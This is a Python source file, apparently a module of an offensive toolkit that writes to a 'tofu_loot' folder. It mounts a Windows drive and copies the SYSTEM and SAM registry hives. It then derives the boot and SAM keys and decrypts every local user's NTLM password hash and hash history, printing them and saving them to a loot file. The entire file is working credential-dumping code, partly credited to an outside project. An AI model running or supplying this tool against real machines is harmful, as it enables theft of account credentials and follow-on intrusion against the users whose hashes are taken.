import subprocess
import shutil
import os
from struct import unpack, pack
import binascii
from collections import namedtuple
from Crypto.Hash import MD5
from Crypto.Cipher import ARC4, DES, AES
import time


# FROM https://github.com/vincd/samdumpy/blob/master/samdum.py
# All credit goes to them
NK_ID = 0x6B6E
NK_ROOT = 0x2c

NK_HDR = namedtuple('NK_HDR', 'id type t1 t2 unk1 parent_off subkey_num unk2 lf_off unk3 value_cnt value_off sk_off classname_off unk41 unk42 unk43 unk44 unk5 name_len classname_len key_name')
LF_HDR = namedtuple('LF_HDR', 'id key_num hr')
VK_HDR = namedtuple('VK_HDR', 'id name_len data_len data_off data_type flag unk1 value_name')
HASH_RECORD = namedtuple('HASH_RECORD', 'nk_offset keyname')

class RegHive(object):
    def __init__(self, path):
        with open(path, 'rb') as fd:
            self.__base = fd.read()
            self.__base = self.__base[0x1000:]
        self.__root_key = self.regGetRootKey()
    def regGetRootKey(self):
        n = self.__read_nk(0x20)
        return n if n.id == NK_ID and n.type == NK_ROOT else None

    def regOpenKey(self, path):
        n = self.__root_key
        path_split = path.split(b'\\')

        while len(path_split) > 0:
            t = path_split.pop(0)
            next_off = self.__parself(t, n.lf_off)
            if next_off == -1: return None
            n = self.__read_nk(next_off)

        return n

    def regQueryValue(self, n, value):
        for i in self.__read_valuelist(n):
            v = self.__read_vk(i)

            if v.value_name == value or (v.flag & 1) == 0:
                data_len = v.data_len & 0x0000FFFF
                return v.data_off if data_len < 5 else self.__read_data(v.data_off, data_len)

    def regEnumKey(self, nr):
        for i in range(nr.subkey_num):
            lf = self.__read_lf(nr.lf_off)
            hr = self.__read_hr(lf.hr, i)
            nk = self.__read_nk(hr.nk_offset)

            yield nk.key_name

    def __read_nk(self, offset):
        n = NK_HDR._make(unpack('hhiiiiiiiiiiiiiiiiihhs', self.__base[offset+4:offset+4+77]))
        n = n._replace(key_name=self.__base[offset+4+76:offset+4+76+n.name_len])

        return n

    def __read_lf(self, offset):
        lf = LF_HDR._make(unpack('hhB', self.__base[offset+4:offset+4+5]))
        lf = lf._replace(hr=offset+4+4)

        return lf

    def __read_hr(self, offset, index):
        offset += 8 * index
        hr = HASH_RECORD._make(unpack('i4s', self.__base[offset:offset+8]))

        return hr

    def __parself(self, t, offset):
        l = self.__read_lf(offset)

        for i in range(l.key_num):
            hr = self.__read_hr(l.hr, i)
            n = self.__read_nk(hr.nk_offset)
            if t == n.key_name:
                return hr.nk_offset

        return -1

    def __read_vk(self, offset):
        vk = VK_HDR._make(unpack('hhiiihhs', self.__base[offset+4:offset+4+21]))
        vk = vk._replace(value_name=self.__base[offset+4+20:offset+4+20+vk.name_len])
        return vk

    def __read_valuelist(self, n):
        offset, size = n.value_off, n.value_cnt
        return unpack('%si' % size, self.__base[offset + 4:offset + 4 + size*4])

    def __read_data(self, offset, size):
        return self.__base[offset+4:offset+4+size]

    def read_data(self, n):
        return self.__read_data(n.classname_off, n.classname_len)

# Permutation matrix for boot key
PERMUTATION_MATRIX = [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
      0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]

ODD_PARITY = [
    1,  1,  2,  2,  4,  4,  7,  7,  8,  8, 11, 11, 13, 13, 14, 14,
   16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
   32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
   49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
   64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
   81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
   97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254 ]

def str_to_key(s):
    key = [
        ord(s[0])>>1,
        ((ord(s[0])&0x01)<<6) | (ord(s[1])>>2),
        ((ord(s[1])&0x03)<<5) | (ord(s[2])>>3),
        ((ord(s[2])&0x07)<<4) | (ord(s[3])>>4),
        ((ord(s[3])&0x0F)<<3) | (ord(s[4])>>5),
        ((ord(s[4])&0x1F)<<2) | (ord(s[5])>>6),
        ((ord(s[5])&0x3F)<<1) | (ord(s[6])>>7),
        ord(s[6])&0x7F
    ]

    return bytes(map(lambda k: ODD_PARITY[k<<1], key))

def sid_to_key(sid):
    s1 = ""
    s1 += chr(sid & 0xFF)
    s1 += chr((sid>>8) & 0xFF)
    s1 += chr((sid>>16) & 0xFF)
    s1 += chr((sid>>24) & 0xFF)
    s1 += s1[0];
    s1 += s1[1];
    s1 += s1[2];
    s2 = s1[3] + s1[0] + s1[1] + s1[2]
    s2 += s2[0] + s2[1] + s2[2]

    return str_to_key(s1), str_to_key(s2)

def decrypt_single_hash(rid, hbootkey, enc_hash, apwd):
    d1, d2 = map(lambda k: DES.new(k, DES.MODE_ECB), sid_to_key(rid))

    rc4_key = MD5.new(hbootkey[:0x10] + pack('<L', rid) + apwd).digest()
    obfkey = ARC4.new(rc4_key).encrypt(enc_hash)
    hash = d1.decrypt(obfkey[:8]) + d2.decrypt(obfkey[8:])

    return hash

def get_current_controlSet(registry_hive):
    n = registry_hive.regOpenKey(b'Select')
    currentControlSet = ''

    for source in [b'Current', b'Default']:
        controlSet = registry_hive.regQueryValue(n, source)
        if controlSet:
            currentControlSet = b'ControlSet%03d\\Control\\Lsa\\' % controlSet
            break

    return currentControlSet

def get_bootkey(bootkeyFile):
    h = RegHive(bootkeyFile)
    current_controlset = get_current_controlSet(h)

    lsa_keys = [b'JD', b'Skew1', b'GBG', b'Data']

    bootkey = b''
    for k in lsa_keys:
        rr = h.read_data(h.regOpenKey(current_controlset + k))
        bootkey += rr

    bootkey = binascii.unhexlify(str(object=bootkey, encoding='utf-16-le'))
    bootkey_scrambled = bytes(map(lambda i: bootkey[PERMUTATION_MATRIX[i]], range(len(bootkey))))
    return bootkey_scrambled

def get_hbootkey(h, sys_key):
    aqwerty = b'!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00'
    anum = b'0123456789012345678901234567890123456789\x00'

    regaccountkey = b'SAM\\Domains\\Account'

    # Open SAM\\SAM\\Domains\\Account key
    n = h.regOpenKey(regaccountkey)
    domain_account_f = h.regQueryValue(n, b"F")

    #print(domain_account_f.hex())
    if domain_account_f[0] != 2 and domain_account_f[0] != 3:
        raise Exception(f'Unknow F revision {domain_account_f[0]}')

    keys1 = domain_account_f[0x68:0xA8]
    #print(keys1.hex())
    if keys1[0] == 0x01:
        # hash the sys_key
        key1_salt = keys1[0x08:0x18]
        rc4_key = MD5.new(key1_salt + aqwerty + sys_key + anum).digest()
        sam_key = ARC4.new(rc4_key).encrypt(keys1[0x18:0x28])
        return sam_key

    elif keys1[0] == 0x02:
        aes_salt = keys1[0x10:0x20]
        aes_data = keys1[0x20:0x30]
        aes = AES.new(sys_key, AES.MODE_CBC, iv=aes_salt)
        sam_key = aes.decrypt(aes_data)
        return sam_key
    else:
        raise Exception(f'Unknown Struct Key revision {keys1[0]}')


def decrypt_hash(rid, encrypted_hash):
        d1, d2 = map(lambda k: DES.new(k, DES.MODE_ECB), sid_to_key(rid))
        decrypted_hash = d1.decrypt(encrypted_hash[:8]) + d2.decrypt(encrypted_hash[8:])
        return decrypted_hash.hex()

def get_hash(sam_key, user_account, rid, offset, password_salt):
    hash_entry_offet = unpack('<L', user_account[0x0c*offset:0x0c*offset+4])[0] + 0xcc
    hash_entry_length = unpack('<L', user_account[0x0c*offset+4:0x0c*offset+8])[0]
    hash_entry = user_account[hash_entry_offet:hash_entry_offet+hash_entry_length]
    #print(hash_entry[2], hash_entry_offet - 0xcc, hash_entry_length, hash_entry.hex())

    if hash_entry[2] == 1:
        xx = sam_key[:0x10] + pack('<L', rid) + password_salt
        rc4_key = MD5.new(xx).digest()
        encrypted_hash = ARC4.new(rc4_key).encrypt(hash_entry[4:20])
        return decrypt_hash(rid, encrypted_hash[:16])

    elif hash_entry[2] == 2:
        aes_salt = hash_entry[0x08:0x18]
        aes = AES.new(sam_key, AES.MODE_CBC, aes_salt)
        encrypted_hash = aes.decrypt(hash_entry[0x18:])
        return decrypt_hash(rid, encrypted_hash[:16])

    else:
        raise Exception(f'Unknow SAM_HASH revision {hash_entry[2]}')

    return hash_entry


def get_hashes(h, sam_key):
    almpassword = b'LMPASSWORD\0'
    antpassword = b'NTPASSWORD\0'
    empty_lm = 'aad3b435b51404eeaad3b435b51404ee'
    empty_nt = '31d6cfe0d16ae931b73c59d7e0c089c0'

    root_key = h.regGetRootKey()
    reguserskey = b'SAM\\Domains\\Account\\Users'
    n = h.regOpenKey(reguserskey)

    for regkeyname in h.regEnumKey(n):
        if b'Names' in regkeyname: continue

        keyname = reguserskey + b'\\' + regkeyname
        n = h.regOpenKey(keyname)
        user_account = h.regQueryValue(n, b'V')
        user_account_data_offet = 0xcc

        # rid
        rid = int(regkeyname, 16)

        # get the username
        name_offset = unpack('<L', user_account[0x0c:0x10])[0] + user_account_data_offet
        name_length = unpack('<L', user_account[0x10:0x14])[0]
        #print(name_offset, name_length)
        username = user_account[name_offset:name_offset+name_length].decode('utf-16-le')
        print("===================================================")
        ntlm_hash = get_hash(sam_key,user_account,rid,14,antpassword)
        ntlm_hash_history = get_hash(sam_key,user_account,rid,16,antpassword)
        print(f"---/ Username : {username}")
        #print(user_account[0xcc:].hex())
        print('--- / NTLM hash :',ntlm_hash)
        print('--- / NTLM hash history:',ntlm_hash_history)
        print("===================================================")
        if username and ntlm_hash:
                open("tofu_loot/hashes.txt",'a').write(f"{username}:{ntlm_hash}\n")


def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				# quick clean up incase another script forgot to unmount the filesystem
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		print("[#] Preparing hash file at 'tofu_loot/hashes.txt'")
		try:
			open("tofu_loot/hashes.txt",'x').close()
		except FileExistsError:
			pass

		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		try:
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
			time.sleep(2)
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
				print("[+] Successfully unmounted")
			except Exception as unmount_error:
				print(f"Error Unmounting : {unmount_error}")
			bootkey = get_bootkey("tofu_tmp/HASHDUMP_SYSTEM")
			print(f"[+] Bootkey {bootkey}")
			registry_hive = RegHive("tofu_tmp/HASHDUMP_SAM")
			domain_key = get_hbootkey(registry_hive,bootkey)
			print(f"[+] SAM Key : {domain_key}")
			print("===================================================")

			get_hashes(registry_hive,domain_key)
			try:
				os.remove("tofu_tmp/HASHDUMP_SYSTEM")
				os.remove("tofu_tmp/HASHDUMP_SAM")
			except Exception as delete_error:
				print(f"[-] Error while deleting temporary files : {delete_error}")			
			print("[+] Hashes saved to 'tofu_loot/hashes.txt'")
		except Exception as open_error:
			print(f"[-] Error {open_error}")
